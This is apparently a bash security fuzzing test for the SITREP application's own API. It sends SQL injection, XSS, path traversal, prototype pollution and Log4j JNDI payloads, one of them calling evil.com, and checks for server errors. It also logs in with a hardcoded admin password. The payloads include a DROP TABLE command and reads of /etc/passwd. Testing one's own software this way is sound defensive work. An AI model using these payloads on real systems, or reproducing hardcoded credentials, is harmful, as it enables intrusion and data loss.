#!/usr/bin/env bash
# ============================================================
# SITREP — Security Fuzzing Test
# Injects malicious payloads across 10+ endpoints to verify
# no 500 errors, crashes, or data leakage.
# Payloads: SQLi, XSS, path traversal, JNDI, null bytes,
#           prototype pollution, oversized inputs
# ============================================================
set -uo pipefail

BASE="${1:-https://sitrep.ultimamilla.com.ar}"
API="$BASE/api"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

PASS=0
FAIL=0

echo -e "${YELLOW}═══ Security Fuzzing Test ═══${NC}"
echo "Target: $API"
echo ""

# Authenticate
TOKEN=$(curl -s -X POST "$API/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@dgfa.mendoza.gov.ar","password":"admin123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['tokens']['accessToken'])" 2>/dev/null)

if [ -z "$TOKEN" ]; then
  echo -e "  ${RED}FATAL: Authentication failed${NC}"
  exit 1
fi

# Payload definitions
SQLI_PAYLOADS=(
  "' OR '1'='1"
  "'; DROP TABLE usuarios; --"
  "' UNION SELECT * FROM usuarios --"
  "admin'--"
  "1; SELECT * FROM admin WHERE 1=1 --"
  "' OR 1=1 /*"
  "admin' WAITFOR DELAY '00:00:5' --"
)

XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "javascript:alert(1)"
  "\"><script>alert(1)</script>"
  "<body onload=alert(1)>"
)

TRAVERSAL_PAYLOADS=(
  "../../../etc/passwd"
  "..\\..\\..\\windows\\system32\\config"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
  "....//....//....//etc/passwd"
  "..%252f..%252f..%252fetc/passwd"
)

SPECIAL_PAYLOADS=(
  '${jndi:ldap://evil.com/exploit}'  # Log4j JNDI
  '${${::-j}ndi}'                     # Log4j obfuscated
  'test%00'                           # Null byte
  '%00'                               # Null byte only
  '__proto__'                         # Prototype pollution
  'constructor'                       # Prototype pollution via constructor
  '{"__proto__":{"admin":true}}'      # JSON prototype pollution
  'null'                              # Literal null
  'undefined'                         # Literal undefined
  '-1'                                # Negative ID
  '9.9999999999999999999999999'       # Overflow
)

OVERSIZE=$(python3 -c "print('A' * 10000)")

# Endpoints to fuzz (GET with query params)
GET_ENDPOINTS=(
  "$API/manifiestos"
  "$API/actores"
  "$API/catalogos/residuos"
  "$API/reportes/manifiestos"
)

# Run fuzzing payloads
fuzz_endpoint() {
  local label="$1"
  local method="$2"
  local url="$3"
  local payload="$4"
  local data_field="$5"

  local code
  if [ "$method" = "GET" ]; then
    code=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$url" \
      -H "Authorization: Bearer $TOKEN" \
      --max-time 10 2>/dev/null)
  elif [ "$method" = "POST" ]; then
    code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "$payload" --max-time 10 2>/dev/null)
  fi

  if [ "$code" = "500" ]; then
    echo -e "    ${RED}FAIL${NC} [500] $label"
    FAIL=$((FAIL+1))
  else
    echo -e "    ${GREEN}PASS${NC} [$code] $label"
    PASS=$((PASS+1))
  fi
}

# ── SQLi on GET endpoints ──
echo "--- SQL Injection (GET query params) ---"
for ep in "${GET_ENDPOINTS[@]}"; do
  for payload in "${SQLI_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)
    fuzz_endpoint "SQLi on $(basename $ep)" "GET" "$ep?q=$encoded" "" ""
  done
done

# ── XSS on search ──
echo "--- XSS on /api/search ---"
for payload in "${XSS_PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)
  fuzz_endpoint "XSS on search" "GET" "$API/search?q=$encoded" "" ""
done

# ── Path traversal ──
echo "--- Path Traversal ---"
for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)
  fuzz_endpoint "Traversal on search" "GET" "$API/search?q=$encoded" "" ""
  fuzz_endpoint "Traversal on manifiestos" "GET" "$API/manifiestos?search=$encoded" "" ""
done

# ── Special payloads (Log4j, null bytes, prototype pollution) ──
echo "--- Special Payloads ---"
for payload in "${SPECIAL_PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null)
  fuzz_endpoint "Special on search" "GET" "$API/search?q=$encoded" "" ""
  fuzz_endpoint "Special on manifiestos" "GET" "$API/manifiestos?search=$encoded" "" ""
done

# ── Oversize payload on POST endpoints ──
echo "--- Oversized Payloads ---"
fuzz_endpoint "10k chars on search" "GET" "$API/search?q=$OVERSIZE" "" ""
fuzz_endpoint "10k chars on manifiestos" "GET" "$API/manifiestos?search=$OVERSIZE" "" ""

# ── Fuzzing POST endpoints with malformed JSON ──
echo "--- Malformed JSON on POST endpoints ---"
POST_ENDPOINTS=(
  "$API/auth/login"
  "$API/auth/register"
  "$API/manifiestos"
)

for ep in "${POST_ENDPOINTS[@]}"; do
  fuzz_endpoint "SQLi body on $(basename $ep)" "POST" "$ep" \
    "{\"email\":\"' OR '1'='1\",\"password\":\"' OR '1'='1\"}" ""
  fuzz_endpoint "XSS body on $(basename $ep)" "POST" "$ep" \
    "{\"email\":\"<script>alert(1)</script>\",\"password\":\"Test1234!\"}" ""
  fuzz_endpoint "Prototype pollution on $(basename $ep)" "POST" "$ep" \
    "{\"__proto__\":{\"admin\":true},\"email\":\"test@test.com\"}" ""
  fuzz_endpoint "Oversize JSON on $(basename $ep)" "POST" "$ep" \
    "{\"email\":\"$OVERSIZE\",\"password\":\"Test1234!\"}" ""
done

# ── Summary ──
echo ""
echo -e "${YELLOW}═══════════════════════════════════════${NC}"
echo -e "  PASS: $PASS  FAIL: $FAIL"
if [ "$FAIL" -eq 0 ]; then
  echo -e "  ${GREEN}ALL PASSED (no 500 errors from any payload)${NC}"
else
  echo -e "  ${RED}$FAIL payloads caused 500 errors${NC}"
fi
exit "$FAIL"
